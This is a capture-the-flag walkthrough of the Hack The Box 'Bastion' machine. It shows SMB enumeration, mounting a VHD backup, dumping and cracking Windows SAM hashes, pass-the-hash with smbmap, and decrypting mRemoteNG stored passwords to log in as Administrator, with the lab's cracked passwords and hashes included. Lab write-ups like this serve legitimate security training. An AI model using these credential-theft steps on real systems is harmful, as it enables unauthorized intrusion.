# Bastion

![image](https://user-images.githubusercontent.com/5285547/124922763-bdd69080-dff1-11eb-8d6f-a61503cb4e42.png)

## Nmap 

```
PORT      STATE SERVICE      VERSION
22/tcp    open  ssh          OpenSSH for_Windows_7.9 (protocol 2.0)
| ssh-hostkey: 
|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)
|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)
|_  256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
49670/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -39m58s, deviation: 1h09m14s, median: 0s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Bastion
|   NetBIOS computer name: BASTION\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-07-08T14:41:29+02:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-07-08T12:41:28
|_  start_date: 2021-07-08T05:30:31
```

## Smb

```
smbclient -L \\10.10.10.134                   
Enter WORKGROUP\ac1d's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        Backups         Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
```


/backups
```
smbclient \\\\10.10.10.134\\backups

smb: \> ls
  .                                   D        0  Thu Jul  8 08:39:38 2021
  ..                                  D        0  Thu Jul  8 08:39:38 2021
  note.txt                           AR      116  Tue Apr 16 11:10:09 2019
  OBFUEDPSHM                          D        0  Thu Jul  8 08:39:38 2021
  SDT65CB.tmp                         A        0  Fri Feb 22 12:43:08 2019
  WindowsImageBackup                 Dn        0  Fri Feb 22 12:44:02 2019
```

```
cat note.txt 

Sysadmins: please don't transfer the entire backup file locally, the VPN to the subsidiary office is too slow.
```

![image](https://user-images.githubusercontent.com/5285547/124925815-c086b500-dff4-11eb-85a6-d8fed8fef8ff.png)

We see some vhd files, but with the note.txt in mind, we should not try to copy them across as they are vrey large files.  
Instead we can mount them using the info here: https://vk9-sec.com/mount-extract-password-hashes-from-vhd-files/

```
sudo apt install libguestfs-tools -y
sudo mkdir /mnt/vhd 
ls -ld /mnt/vhd
sudo mount -t cifs //10.10.10.134/backups /mnt/vhd -o user,password=
cd "/mnt/vhd/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351"
```

This command takes a while so wait a bit. 
```
guestmount --add 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro /mnt/any
cd /mnt/any
```

![image](https://user-images.githubusercontent.com/5285547/124927480-98985100-dff6-11eb-87df-9c50b57ff66f.png)


## Cracking SAM database files

Find the SAM database location:
```
cd /mnt/any/Windows/System32/config
cp SAM SYSTEM /tmp 
cd /tmp
```
```
impacket-secretsdump -sam SAM -system SYSTEM local > file
```
![image](https://user-images.githubusercontent.com/5285547/124928250-60454280-dff7-11eb-8a71-52581bbf9f9d.png)

```
john file.sam --wordlist=/usr/share/wordlists/rockyou.txt --format=NT
Press 'q' or Ctrl-C to abort, almost any other key for status
                 (Administrator)
bureaulampje     (L4mpje)
```

# User

Access 
```
ssh l4mpje@10.10.10.134
bureaulampje
```
or
```
smbmap -u l4mpje -p aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9 -H 10.10.10.134
[+] IP: 10.10.10.134:445        Name: 10.10.10.134                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        Backups                                                 READ, WRITE
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
```

user.txt

```
 Directory of C:\Users\L4mpje\Desktop                                                                                           

22-02-2019  16:27    <DIR>          .                                                                                           
22-02-2019  16:27    <DIR>          ..                                                                                          
23-02-2019  10:07                32 user.txt                                                                                    
               1 File(s)             32 bytes                                                                                   
               2 Dir(s)  11.291.443.200 bytes free 
```

## Root

Looking around the file system, we notice an unusual app in the programs folder. 

![image](https://user-images.githubusercontent.com/5285547/124932200-c5e6fe00-dffa-11eb-848a-29f8ba3c5857.png)

Checking this out online, it seems to be a credential backup software. (link: https://mremoteng.org/)

On the websites forums it hinted to a path for the saved creds

![image](https://user-images.githubusercontent.com/5285547/124932516-0e062080-dffb-11eb-9617-b5d872166d1e.png)

![image](https://user-images.githubusercontent.com/5285547/124932678-2ece7600-dffb-11eb-98b1-5eedbbfbd561.png)

```
type .\confCons.xml
```

We see two entries, 

Admin
```
<Node Name="DC" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="500e7d58-662a-44d4-aff0-3a4f547a3fee" Userna                                                                                                             
me="Administrator" Domain="" Password="aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw=="                                                                                                             
 Hostname="127.0.0.1" Protocol="RDP" PuttySession="Default Settings" Port="3389"
```

L4mpje
```
<Node Name="L4mpje-PC" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="8d3579b2-e68e-48c1-8f0f-9ee1347c9128"                                                                                                             
 Username="L4mpje" Domain="" Password="yhgmiu5bbuamU3qMUKc/uYDdmbMrJZ/JvR1kYe4Bhiu8bXybLxVnO0U9fKRylI7NcB9QuRsZVvla8esB" Hostnam                                                                                                             
e="192.168.1.75" Protocol="RDP" 
```

Using this github source we can crack the passwords:  
https://github.com/kmahyyg/mremoteng-decrypt

![image](https://user-images.githubusercontent.com/5285547/124933371-bddb8e00-dffb-11eb-86e6-f60e3c4d900a.png)

![image](https://user-images.githubusercontent.com/5285547/124933439-cdf36d80-dffb-11eb-8750-a8ddd37d38ea.png)

Let's login as Administrator and get the last flag! 

```
ssh administrator@10.10.10.134
thXLHM96BeKL0ER2
```

![image](https://user-images.githubusercontent.com/5285547/124933650-f4b1a400-dffb-11eb-805c-0948868f314a.png)

Thanks, Another one down! 



